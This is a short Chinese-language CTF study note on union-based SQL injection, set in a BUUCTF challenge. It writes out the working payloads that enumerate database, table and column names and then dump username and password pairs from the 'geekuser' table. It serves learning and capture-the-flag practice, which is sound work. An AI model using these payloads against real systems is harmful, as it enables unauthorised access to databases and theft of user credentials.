---
title: SQL 爆库名表名列名数据小结
categories:
- Note&Summary
tag:
- CTF
- web
date: 2024-09-07 23:18:01
excerpt: 学习中......
index_img: /img/SQL.png
banner_img: /img/SQL.png
---

# SQL 爆库名表名列名数据小结

本篇以 BUUCTF-[极客大挑战 2019]BabySQL 1 为例，但不涉及该题详细内容

题中涉及到双写绕过关键字过滤，在以下不做考虑，仅借用本题场景

1.通过 `order by` 判断得出数据表为 3 列，并测试得回显 2、3

2.获取所有库名 `1' union select 1,database(),group_concat(schema_name) from information_schema.schemata #` 得到 geek 以及 information_schema,mysql,performance_schema,test,ctf,geek

3.获取 geek 库中的表名 `1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='geek' #` 得到 b4bsql,geekuser

4.获取 geekuser 中的列名 `1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='geekuser' #` 得到 id,username,password

5.获取数据 `1' union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.geekuser #` 其中 `concat_ws()` 函数的功能是指定参数之间的分隔符，`0x7e` 即为 `~`，非必须，from 后的格式为“库名.表名”

参考：[https://www.cnblogs.com/xiaobai141/p/14160758.html](https://www.cnblogs.com/xiaobai141/p/14160758.html)
